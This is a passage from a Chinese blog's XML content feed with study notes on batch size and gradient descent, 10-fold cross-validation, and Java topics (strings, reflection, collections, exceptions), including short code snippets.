Descent：所有样本算出的梯度的平均值来更新每一步</li><li>Stochastic Gradient Descent：一个样本算出的梯度来更新每一步</li></ul><p>虽然从<strong>直觉上</strong>，Gradient Descent 可以快速准确的将训练集的 loss 降低到最小，但实际上很容易陷入局部最小值或鞍点 (不知道什么是鞍点的看 <a href="https://www.zhihu.com/people/02c1927a26f1fa47d3d43ec304b81015">@夕小瑶Elsa</a> 的 <a href="https://link.zhihu.com/?target=https://mp.weixin.qq.com/s?__biz=MzIwNzc2NTk0NQ==&mid=2247484570&idx=1&sn=4c0b6b76a7f2518d77818535b677e087&chksm=970c2c4ca07ba55ad5cfe6b46f72dbef85a159574fb60b9932404e45747c95eed8c6c0f66d62%23rd">batch</a>) 无法继续下降，反而达不到最小。而且 GD 每一步的计算量巨大。即使是可以成功将训练集的 loss 降到最低，可我们并不关心训练集的表现，我们关心的是<strong>测试集</strong>的表现。训练集表现好，测试集表现差的过拟合 (overfitting) 并不是我们想要的。<br>Stochastic Gradient Descent 的随机性有利于跳出鞍点，又具有加强普遍性 (测试集上表现优秀) 的作用。可观看以下视频感受 <strong>SGD 如何缓解陷入局部最小值</strong><br><a href="https://video.zhihu.com/video/1031175825587978240">https://video.zhihu.com/video/1031175825587978240?</a><br>可惜训练耗时，同时过大的样本差异会使训练比较震荡，所以有了 Minibatch Gradient Descent 方法，同时具有二者的特点，是以 n 个样本算出的梯度的平均值来更新每一步。然而不得不苦逼的根据不同的任务去寻找最优的 n 。不过在计算机视觉中，由于 batch normalization 的帮助，可以使用极大的 batch size，这时的 batch size 往往是受限于 GPU 的显存大小。</p><hr><h2 id="个人经验分享"><a href="#个人经验分享" class="headerlink" title="个人经验分享"></a>个人经验分享</h2><p>个人习惯从 batch size 以 128 为分界线。向下 (x0.5) 和向上 (x2) 训练后比较测试结果。若向下更好则再 x0.5，直到结果不再提升。<br>我遇到过很多情况。<br>比如同样的 cnn+rnn 模型结构，adam 更新法，learning rate 和其他参数全部相同。</p><ul><li><strong>例1：</strong>遇到某个语音、画面、自然语言不同任务时，最好的 batch size 分别为 8, 32, 16。</li><li><strong>例2：</strong>遇到某个多信号语音识别任务时， <strong>batch size 为 1 最好</strong>，可是训练时间让人抓狂，尤其是使用循环网络时。而将这些多个信号之间做 inversion mapping 时，结果却是 batch size 设为 32 后效果依然提升，但由于 GPU 显存限制无法继续加大 batch size。</li></ul><p>可以看出来，调参也有时间和空间的限制：</p><blockquote><p><strong>大 batch size 限于空间，小 batch size 苦于时间。</strong></p></blockquote><hr><h2 id="为什么-batch-size-会影响训练结果"><a href="#为什么-batch-size-会影响训练结果" class="headerlink" title="为什么 batch size 会影响训练结果"></a>为什么 batch size 会影响训练结果</h2><p><a href="https://www.zhihu.com/people/c4cfdf10563bff74ebf3e58d9f1c8592">@Unstoppable</a> 有问到“一直很难理解为什么 batch size 会影响训练结果，答主能解读一下么”。<br>举一个特别简化的例子。<br>假如要学习一个f:x-&gt;y去拟合下面这样的一维数据，如下图所示。有 6 个训练样本 (编号 1,2,3,4,5,6)。<br><img src="https://z3.ax1x.com/2021/06/16/2Lm82D.jpg"><br>如果使用 Gradient Descent，那么每一步的更新都会向类似于黄线那种同时满足 6 个样本的 f 去贴近 (不是一步到位，而是一点点更新变形)。<br>如果使用 Stochastic Gradient Descent，那么每一步的更新都会向能穿过该样本点的f 去贴近。<br>如果使用 3-Batch Gradient Descent，那么每一步都会向同时满足 3 个样本点的形状更新，比如 1,2,3 样本组成的 batch 会往黑色虚线的形状变化。下一步可能是向同时满足 1,5,6 的 batch 的形状去变化。<br>同理，若使用 2-Batch Gradient Descent，绿色虚线是例子。<br>打个比方。这好比素描绘画，不同的 batch 策略决定了用什么样的线条 (线段、曲线段、角度等) 去描绘 (允许覆盖已画的线条)，最后画出的图形是由这些线条构成的。神经网络训练所得的 f 也是根据梯度 (类比线条) 一点点更新出来的。所以能够影响梯度的 batch size 会影响神经网络训练出的 f 。<br>诚然用 Gradient Descent 同时参考所有的训练样本去选择绘画线条的话，感觉上最能够画出拟合所有训练集样本的形状，但是这样会使每次绘画的线条从绘画开始到结束都是一样的 (对应神经网络陷入鞍点)，仅仅是不断的描粗线条，反而容易画不出想要的形状。即便是能够成功画出，但别忘了，我们真正想要画的<strong>形状是连同测试样本在内的 (编号 a,b) 也同时满足的 f</strong>。<br>可以把神经网络的训练想象成一种特殊的绘画。绘画过程中不允许使用测试样本作为参考，只允许用<strong>有限的</strong>训练样本作为参考，还要求所画的形状覆盖测试样本。</p><hr><h2 id="Tensorflow-Playground-演示"><a href="#Tensorflow-Playground-演示" class="headerlink" title="Tensorflow Playground 演示"></a><a href="https://link.zhihu.com/?target=http://playground.tensorflow.org/">Tensorflow Playground</a> 演示</h2><p>我们可以用<a href="https://link.zhihu.com/?target=http://playground.tensorflow.org/">Tensorflow — Neural Network Playground</a>来实际的体验一下这种“绘画”过程。</p><hr><h2 id="关于Batch-Normalization"><a href="#关于Batch-Normalization" class="headerlink" title="关于Batch Normalization"></a>关于Batch Normalization</h2><p>Batch Normalization是2015年一篇论文中提出的数据归一化方法，往往用在深度神经网络中激活层之前。其作用可以加快模型训练时的收敛速度，使得模型训练过程更加稳定，避免梯度爆炸或者梯度消失。并且起到一定的正则化作用，几乎代替了Dropout。</p>]]></content>
      
      
      <categories>
          
          <category> DL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> dl </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>十折交叉验证</title>
      <link href="/2021/06/16/%E5%8D%81%E6%8A%98%E4%BA%A4%E5%8F%89%E9%AA%8C%E8%AF%81_(1)/"/>
      <url>/2021/06/16/%E5%8D%81%E6%8A%98%E4%BA%A4%E5%8F%89%E9%AA%8C%E8%AF%81_(1)/</url>
      
        <content type="html"><![CDATA[<blockquote><p>  十折交叉验证，英文名叫做10-fold cross-validation，用来测试算法准确性。是常用的测试方法。将数据集分成十份，轮流将其中9份作为训练数据，1份作为测试数据，进行试验。</p></blockquote><blockquote><p>  每次试验都会得出相应的正确率（或差错率）。10次的结果的正确率（或差错率）的平均值作为对算法精度的估计，一般还需要进行多次10折交叉验证（例如10次10折交叉验证），再求其均值，作为对算法准确性的估计。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> DL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> dl </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第13章 字符串</title>
      <link href="/2021/06/16/%E7%AC%AC13%E7%AB%A0_%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
      <url>/2021/06/16/%E7%AC%AC13%E7%AB%A0_%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
      
        <content type="html"><![CDATA[<h2 id="13-1-不可变String"><a href="#13-1-不可变String" class="headerlink" title="13.1 不可变String"></a>13.1 不可变String</h2><p><strong>String类中修改String的方法都是创建新的String，最初的String不变</strong><br>**</p><h2 id="13-2-String中’-’-和StringBuilder"><a href="#13-2-String中’-’-和StringBuilder" class="headerlink" title="13.2 String中’+’ 和StringBuilder"></a>13.2 String中’+’ 和StringBuilder</h2><p><strong>String中的 ‘+’ 每次编译器会自动优化创建一个StringBuilder对象，使用其append（）方法。</strong></p><blockquote><p><strong>‘+’ 和StringBuilder使用场景：</strong></p><ul><li><strong>若对字符串操作比较简单，可以用 ‘+’ ，信赖编译器自动优化</strong></li><li><strong>若需要用循环对字符串进行操作，最好自己创建StringBuilder对象</strong></li></ul></blockquote><h3 id="StringBuilder常用方法"><a href="#StringBuilder常用方法" class="headerlink" title="StringBuilder常用方法"></a>StringBuilder常用方法</h3><blockquote><ul><li><strong>Stringbuilder insert(int offset , String s/char c)          在位置之前插入String或char</strong></li><li><strong>Stringbuilder append(String s)                                  字符串拼接</strong></li><li><strong>Stringbuilder replace(int start , int end , String s)       替换[ , ) 字符串</strong></li><li><strong>Stringbuilder delete(int start , int end)                       删除[ , ) 字符串</strong></li><li><strong>String toString()                                                      返回字符串</strong></li></ul></blockquote><h2 id="13-4-String常用方法"><a href="#13-4-String常用方法" class="headerlink" title="13.4 String常用方法"></a>13.4 String常用方法</h2><p><img src="https://img14.360buyimg.com/ddimg/jfs/t1/181445/2/9464/261049/60c94bfdE276da18f/707e4518ef45b22c.png"></p>]]></content>
      
      
      <categories>
          
          <category> java编程思想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第14章 反射</title>
      <link href="/2021/06/16/%E7%AC%AC14%E7%AB%A0_%E5%8F%8D%E5%B0%84(1)/"/>
      <url>/2021/06/16/%E7%AC%AC14%E7%AB%A0_%E5%8F%8D%E5%B0%84(1)/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是反射？"><a href="#什么是反射？" class="headerlink" title="什么是反射？"></a>什么是反射？</h2><p><strong>反射是在运行时动态访问类和对象的技术</strong></p><h2 id="为什么要用反射？"><a href="#为什么要用反射？" class="headerlink" title="为什么要用反射？"></a>为什么要用反射？</h2><blockquote><ul><li><strong>实例化对象用new关键字，但是这样就把实例化的工作固定在程序中，不灵活会出现各种问题。</strong></li><li><strong>反射可以将创建对象的时机从编译时延迟到程序运行时</strong></li><li><strong>当添加新的功能时，如果不用反射将需要修改代码，修改完需要重新上线非常麻烦，而用反射则没有这个问题</strong></li></ul></blockquote><h2 id="14-2-Class对象"><a href="#14-2-Class对象" class="headerlink" title="14.2 Class对象"></a>14.2 Class对象</h2><blockquote><p><strong>在程序运行时，Class对象保存了类和对象的具体信息。</strong><br><strong>每个类都有一个Class对象，每当编译一个类，即.java编译成.class文件，就会产生一个Class对象保存在.class文件中</strong></p></blockquote><h2 id="类加载器："><a href="#类加载器：" class="headerlink" title="类加载器："></a>类加载器：</h2><blockquote><p><strong>java程序在运行之前并非完全加载：</strong></p><ul><li><strong>第一次使用这个类，就动态加载到JVM中。当创建第一个对类的静态成员的引用或者构造器时就会加载这个类</strong></li></ul></blockquote><blockquote><p><strong>类加载器工作步骤：</strong></p><ol><li><strong>首先检查一个类的Class对象（或理解.class文件）是否已被加载</strong></li><li><strong>如果尚未加载，默认的类加载器就会根据类名查找.class文件</strong></li><li><strong>一旦Class对象（.class文件）被加载了（载入jvm），它就被用来创建这个类的所有对象</strong></li></ol></blockquote><h3 id="获取Class对象的引用"><a href="#获取Class对象的引用" class="headerlink" title="获取Class对象的引用"></a>获取Class对象的引用</h3><blockquote><p><code>**Class对象 = Class.forName(&quot;...&quot; )**</code><strong>可以返回指定Class对象的引用，并且若指定的类没有被加载，就加载它</strong><br><strong>如果没有Class对象，可以用forName获取。如果已经有一个Class对象，则可以用<code>getClass（)</code> 方法获取Class引用</strong></p></blockquote><hr><h2 id="Class常用方法"><a href="#Class常用方法" class="headerlink" title="Class常用方法"></a>Class常用方法</h2><blockquote><ul><li><strong>Class.forName(“Class path”)           获取指定Class对象</strong></li><li>**Class对象.newInstance()                  使用默认构造器构造对象 **</li><li><strong>Class对象.getConstructor()              获取指定的 public修饰构造方法 Constructor对象</strong></li><li><strong>Class对象.getMethod()                    获取指定的 public修饰方法 Method对象</strong></li><li><strong>Class对象.getField()                        获取指定的 public修饰成员变量 Field对象</strong></li></ul></blockquote><h2 id="使用带参构造方法创建对象（反射）"><a href="#使用带参构造方法创建对象（反射）" class="headerlink" title="使用带参构造方法创建对象（反射）"></a>使用带参构造方法创建对象（反射）</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Class <span class="class"><span class="keyword">class</span>对象 </span>= Class.forName(<span class="string">&quot; Class路径 &quot;</span>);</span><br><span class="line">Constructor constructor = <span class="class"><span class="keyword">class</span>对象.<span class="title">getConstructor</span>(<span class="title">new</span> <span class="title">Class</span>[]</span>&#123; <span class="comment">//通过构造器的参数获取构造器对象</span></span><br><span class="line"><span class="comment">//带参构造器的参数</span></span><br><span class="line">    String.class , Float.class,...</span><br><span class="line">&#125;);</span><br><span class="line">E 类的对象 = (E) constructor.newInstance(<span class="keyword">new</span> Object[]&#123; <span class="comment">//通过构造器对象</span></span><br><span class="line">    <span class="comment">//传递参数给带参构造器</span></span><br><span class="line">    <span class="string">&quot;...&quot;</span>,...,<span class="string">&quot;...&quot;</span>,...</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="使用反射调用方法"><a href="#使用反射调用方法" class="headerlink" title="使用反射调用方法"></a>使用反射调用方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Class <span class="class"><span class="keyword">class</span>对象 </span>= Class.forName(<span class="string">&quot; Class路径 &quot;</span>);</span><br><span class="line">Method method = <span class="class"><span class="keyword">class</span>对象.<span class="title">getMethod</span>(&quot;方法名&quot;,<span class="title">new</span> <span class="title">Class</span>[]</span>&#123;</span><br><span class="line"><span class="comment">//构造器的参数</span></span><br><span class="line">    String.class , Float.class,...</span><br><span class="line">&#125;); <span class="comment">//通过方法名和方法的参数获取方法并返回方法对象</span></span><br><span class="line">method.invoke(类的对象,参数...);<span class="comment">//通过哪个类的对象调用这个方法以及方法参数来执行方法</span></span><br></pre></td></tr></table></figure><h2 id="使用反射获取成员对象"><a href="#使用反射获取成员对象" class="headerlink" title="使用反射获取成员对象"></a>使用反射获取成员对象</h2><p><strong>获取到成员对象后可以通过get或者set获取数据或修改数据</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Class <span class="class"><span class="keyword">class</span>对象 </span>= Class.forName(<span class="string">&quot; Class路径 &quot;</span>);</span><br><span class="line">Field field = <span class="class"><span class="keyword">class</span>对象.<span class="title">getField</span>(&quot;成员对象名&quot;)</span>; <span class="comment">// 通过变量名获取成员对象</span></span><br><span class="line">print(field.get(类的对象)); <span class="comment">// 通过哪个类的对象获取变量</span></span><br><span class="line">field.set(类的对象,需要修改的值); <span class="comment">//修改变量</span></span><br></pre></td></tr></table></figure><p><strong>如果要获取非public则都采用getDeclaredXXX</strong></p>]]></content>
      
      
      <categories>
          
          <category> java编程思想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第14章 反射</title>
      <link href="/2021/06/16/%E7%AC%AC14%E7%AB%A0_%E5%8F%8D%E5%B0%84/"/>
      <url>/2021/06/16/%E7%AC%AC14%E7%AB%A0_%E5%8F%8D%E5%B0%84/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是反射？"><a href="#什么是反射？" class="headerlink" title="什么是反射？"></a>什么是反射？</h2><p><strong>反射是在运行时动态访问类和对象的技术</strong></p><h2 id="为什么要用反射？"><a href="#为什么要用反射？" class="headerlink" title="为什么要用反射？"></a>为什么要用反射？</h2><blockquote><ul><li><strong>实例化对象用new关键字，但是这样就把实例化的工作固定在程序中，不灵活会出现各种问题。</strong></li><li><strong>反射可以将创建对象的时机从编译时延迟到程序运行时</strong></li><li><strong>当添加新的功能时，如果不用反射将需要修改代码，修改完需要重新上线非常麻烦，而用反射则没有这个问题</strong></li></ul></blockquote><h2 id="14-2-Class对象"><a href="#14-2-Class对象" class="headerlink" title="14.2 Class对象"></a>14.2 Class对象</h2><blockquote><p><strong>在程序运行时，Class对象保存了类和对象的具体信息。</strong><br><strong>每个类都有一个Class对象，每当编译一个类，即.java编译成.class文件，就会产生一个Class对象保存在.class文件中</strong></p></blockquote><h2 id="类加载器："><a href="#类加载器：" class="headerlink" title="类加载器："></a>类加载器：</h2><blockquote><p><strong>java程序在运行之前并非完全加载：</strong></p><ul><li><strong>第一次使用这个类，就动态加载到JVM中。当创建第一个对类的静态成员的引用或者构造器时就会加载这个类</strong></li></ul></blockquote><blockquote><p><strong>类加载器工作步骤：</strong></p><ol><li><strong>首先检查一个类的Class对象（或理解.class文件）是否已被加载</strong></li><li><strong>如果尚未加载，默认的类加载器就会根据类名查找.class文件</strong></li><li><strong>一旦Class对象（.class文件）被加载了（载入jvm），它就被用来创建这个类的所有对象</strong></li></ol></blockquote><h3 id="获取Class对象的引用"><a href="#获取Class对象的引用" class="headerlink" title="获取Class对象的引用"></a>获取Class对象的引用</h3><blockquote><p><code>**Class对象 = Class.forName(&quot;...&quot; )**</code><strong>可以返回指定Class对象的引用，并且若指定的类没有被加载，就加载它</strong><br><strong>如果没有Class对象，可以用forName获取。如果已经有一个Class对象，则可以用<code>getClass（)</code> 方法获取Class引用</strong></p></blockquote><hr><h2 id="Class常用方法"><a href="#Class常用方法" class="headerlink" title="Class常用方法"></a>Class常用方法</h2><blockquote><ul><li><strong>Class.forName(“Class path”)           获取指定Class对象</strong></li><li>**Class对象.newInstance()                  使用默认构造器构造对象 **</li><li><strong>Class对象.getConstructor()              获取指定的 public修饰构造方法 Constructor对象</strong></li><li><strong>Class对象.getMethod()                    获取指定的 public修饰方法 Method对象</strong></li><li><strong>Class对象.getField()                        获取指定的 public修饰成员变量 Field对象</strong></li></ul></blockquote><h2 id="使用带参构造方法创建对象（反射）"><a href="#使用带参构造方法创建对象（反射）" class="headerlink" title="使用带参构造方法创建对象（反射）"></a>使用带参构造方法创建对象（反射）</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Class <span class="class"><span class="keyword">class</span>对象 </span>= Class.forName(<span class="string">&quot; Class路径 &quot;</span>);</span><br><span class="line">Constructor constructor = <span class="class"><span class="keyword">class</span>对象.<span class="title">getConstructor</span>(<span class="title">new</span> <span class="title">Class</span>[]</span>&#123; <span class="comment">//通过构造器的参数获取构造器对象</span></span><br><span class="line"><span class="comment">//带参构造器的参数</span></span><br><span class="line">    String.class , Float.class,...</span><br><span class="line">&#125;);</span><br><span class="line">E 类的对象 = (E) constructor.newInstance(<span class="keyword">new</span> Object[]&#123; <span class="comment">//通过构造器对象</span></span><br><span class="line">    <span class="comment">//传递参数给带参构造器</span></span><br><span class="line">    <span class="string">&quot;...&quot;</span>,...,<span class="string">&quot;...&quot;</span>,...</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="使用反射调用方法"><a href="#使用反射调用方法" class="headerlink" title="使用反射调用方法"></a>使用反射调用方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Class <span class="class"><span class="keyword">class</span>对象 </span>= Class.forName(<span class="string">&quot; Class路径 &quot;</span>);</span><br><span class="line">Method method = <span class="class"><span class="keyword">class</span>对象.<span class="title">getMethod</span>(&quot;方法名&quot;,<span class="title">new</span> <span class="title">Class</span>[]</span>&#123;</span><br><span class="line"><span class="comment">//构造器的参数</span></span><br><span class="line">    String.class , Float.class,...</span><br><span class="line">&#125;); <span class="comment">//通过方法名和方法的参数获取方法并返回方法对象</span></span><br><span class="line">method.invoke(类的对象,参数...);<span class="comment">//通过哪个类的对象调用这个方法以及方法参数来执行方法</span></span><br></pre></td></tr></table></figure><h2 id="使用反射获取成员对象"><a href="#使用反射获取成员对象" class="headerlink" title="使用反射获取成员对象"></a>使用反射获取成员对象</h2><p><strong>获取到成员对象后可以通过get或者set获取数据或修改数据</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Class <span class="class"><span class="keyword">class</span>对象 </span>= Class.forName(<span class="string">&quot; Class路径 &quot;</span>);</span><br><span class="line">Field field = <span class="class"><span class="keyword">class</span>对象.<span class="title">getField</span>(&quot;成员对象名&quot;)</span>; <span class="comment">// 通过变量名获取成员对象</span></span><br><span class="line">print(field.get(类的对象)); <span class="comment">// 通过哪个类的对象获取变量</span></span><br><span class="line">field.set(类的对象,需要修改的值); <span class="comment">//修改变量</span></span><br></pre></td></tr></table></figure><p><strong>如果要获取非public则都采用getDeclaredXXX</strong></p>]]></content>
      
      
      <categories>
          
          <category> java编程思想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第11章 持有对象</title>
      <link href="/2021/06/15/%E7%AC%AC11%E7%AB%A0_%E6%8C%81%E6%9C%89%E5%AF%B9%E8%B1%A1/"/>
      <url>/2021/06/15/%E7%AC%AC11%E7%AB%A0_%E6%8C%81%E6%9C%89%E5%AF%B9%E8%B1%A1/</url>
      
        <content type="html"><![CDATA[<h2 id="11-2-基本概念"><a href="#11-2-基本概念" class="headerlink" title="11.2 基本概念"></a>11.2 基本概念</h2><p><img src="https://img14.360buyimg.com/ddimg/jfs/t1/194804/21/8107/119987/60c80d9eE646309f6/14b69fd5d3d42e6d.jpg"></p><blockquote><p><strong>Collection接口：</strong></p><ul><li><strong>List接口：</strong><ul><li><strong>LinkedList：链表，没有同步，线程不安全</strong></li><li><strong>ArrayList：数组，没有同步，线程不安全</strong></li><li><strong>Vector：数组，同步，线程安全</strong><ul><li><strong>Stack：继承Vector，线程安全</strong></li></ul></li></ul></li><li><strong>Set接口：不可重复，内部排序</strong><ul><li><strong>HashSet：散列函数</strong><ul><li><strong>LinkedHashSet：链表维护元素的插入次序</strong></li></ul></li><li><strong>TreeSet：底层为红黑树，自动升序排序保存</strong></li></ul></li></ul></blockquote><blockquote><p><strong>Map接口：</strong></p><ul><li><strong>HashMap：查找最快，无顺序 ，没有同步， 线程不安全</strong><ul><li><strong>LinkedHashMap：保留HashMap的速度，按照插入顺序保存</strong></li></ul></li><li><strong>TreeMap：红黑树，自动升序排序保存</strong></li><li><strong>Hashtable：接口实现类， 同步， 线程安全</strong></li></ul></blockquote><h2 id="11-3-Collection接口方法"><a href="#11-3-Collection接口方法" class="headerlink" title="11.3 Collection接口方法"></a>11.3 Collection接口方法</h2><p><img src="https://img12.360buyimg.com/ddimg/jfs/t1/179128/17/9179/165707/60c74ba0E32f5b85a/9a68e43c3f21496a.jpg"></p><hr><h2 id="11-5-List接口"><a href="#11-5-List接口" class="headerlink" title="11.5 List接口"></a>11.5 List接口</h2><p><img src="https://img14.360buyimg.com/ddimg/jfs/t1/177265/15/8483/192890/60c80984Ec5274ff2/a5c5d7852650e1ad.jpg"></p><hr><h2 id="11-6-迭代器Iterator"><a href="#11-6-迭代器Iterator" class="headerlink" title="11.6 迭代器Iterator"></a>11.6 迭代器Iterator</h2><blockquote><p><strong>Iterator：</strong></p><ul><li><strong>iterator（） 返回一个iterator，将准备好返回序列第一个元素</strong></li><li><strong>next（） 获得序列下一个元素</strong></li><li><strong>hasNext（） 判断序列是否还有元素</strong></li><li><strong>remove（）将迭代器返回的元素删除</strong></li></ul></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Iterator&lt;...&gt; it = a.iterator();</span><br><span class="line"><span class="keyword">while</span>(it.hasNext())&#123;</span><br><span class="line">print(it.next());</span><br><span class="line">    it.remove();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>如果只想遍历List，不想修改，应该用foreach</strong></p><h3 id="11-6-1-ListIterator"><a href="#11-6-1-ListIterator" class="headerlink" title="11.6.1 ListIterator"></a>11.6.1 ListIterator</h3><p><img src="https://img10.360buyimg.com/ddimg/jfs/t1/174547/24/14667/332001/60c81452E423a1227/7973fcdf1a3097f0.jpg"></p><hr><h2 id="11-9-Set"><a href="#11-9-Set" class="headerlink" title="11.9 Set"></a>11.9 Set</h2><blockquote><p><strong>Set和List的区别：</strong></p><ul><li><strong>List元素可以重复，Set不能重复</strong></li><li><strong>List可以根据索引操作元素，Set不能</strong></li><li><strong>List按照插入顺序保存，Set不一定</strong></li></ul></blockquote><hr><h2 id="11-10-Map"><a href="#11-10-Map" class="headerlink" title="11.10 Map"></a>11.10 Map</h2><p><img src="https://img14.360buyimg.com/ddimg/jfs/t1/195266/31/8254/290736/60c84667E2b4c4f75/101c49f5fe6ff436.jpg"></p><hr><h2 id="11-11-Queue"><a href="#11-11-Queue" class="headerlink" title="11.11 Queue"></a>11.11 Queue</h2><p><strong>Collection-》Queue-》LinkedList</strong><br><strong>创建一个队列：<code>Queue&lt;...&gt; queue = new LinkedList&lt;...&gt;()</code></strong></p><h3 id="Queue方法"><a href="#Queue方法" class="headerlink" title="Queue方法"></a>Queue方法</h3><blockquote><ul><li><strong>继承自Collection，特殊方法如下：</strong><ul><li><strong>boolean offer（） 将元素插入队尾，或返回false</strong></li><li><strong>E peek（） 返回队头，若队列为空则返回null</strong></li><li><strong>E poll（） 删除队头并返回，若队列为空返回null</strong></li></ul></li></ul></blockquote><h3 id="11-11-1-PriorityQueue"><a href="#11-11-1-PriorityQueue" class="headerlink" title="11.11.1 PriorityQueue"></a>11.11.1 PriorityQueue</h3><ul><li><strong>自定义优先级比较器，作为优先队列构造器的参数。</strong></li><li><strong>优先队列继承自Queue，有同样的方法。</strong><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//自定义比较器，降序排列</span></span><br><span class="line"><span class="keyword">static</span> Comparator&lt;Integer&gt; cmp = <span class="keyword">new</span> Comparator&lt;Integer&gt;() &#123;</span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(Integer e1, Integer e2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> e2 - e1;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//不用比较器，默认升序排列</span></span><br><span class="line">        Queue&lt;Integer&gt; q = <span class="keyword">new</span> PriorityQueue&lt;&gt;();</span><br><span class="line">        q.add(<span class="number">3</span>);</span><br><span class="line">        q.add(<span class="number">2</span>);</span><br><span class="line">        q.add(<span class="number">4</span>);</span><br><span class="line">        <span class="keyword">while</span>(!q.isEmpty())</span><br><span class="line">        &#123;</span><br><span class="line">            System.out.print(q.poll()+<span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 输出结果</span></span><br><span class="line"><span class="comment">         * 2 3 4</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="comment">//使用自定义比较器，降序排列</span></span><br><span class="line">        Queue&lt;Integer&gt; qq = <span class="keyword">new</span> PriorityQueue&lt;&gt;(cmp);</span><br><span class="line">        qq.add(<span class="number">3</span>);</span><br><span class="line">        qq.add(<span class="number">2</span>);</span><br><span class="line">        qq.add(<span class="number">4</span>);</span><br><span class="line">        <span class="keyword">while</span>(!qq.isEmpty())</span><br><span class="line">        &#123;</span><br><span class="line">            System.out.print(qq.poll()+<span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> java编程思想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第12章 异常</title>
      <link href="/2021/06/15/%E7%AC%AC12%E7%AB%A0_%E5%BC%82%E5%B8%B8/"/>
      <url>/2021/06/15/%E7%AC%AC12%E7%AB%A0_%E5%BC%82%E5%B8%B8/</url>
      
        <content type="html"><![CDATA[<h2 id="异常类型："><a href="#异常类型：" class="headerlink" title="异常类型："></a>异常类型：</h2><p><img src="https://img12.360buyimg.com/ddimg/jfs/t1/193416/23/8345/103204/60c85e4cEf4c28547/920bb04309c42c67.jpg"></p><hr><h2 id="12-4-创建自定义异常"><a href="#12-4-创建自定义异常" class="headerlink" title="12.4 创建自定义异常"></a>12.4 创建自定义异常</h2><blockquote><p><strong>创建自定义异常类并继承Throwable类或其子类</strong></p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">newException</span> <span class="keyword">extends</span> <span class="title">Exception</span></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">newException</span><span 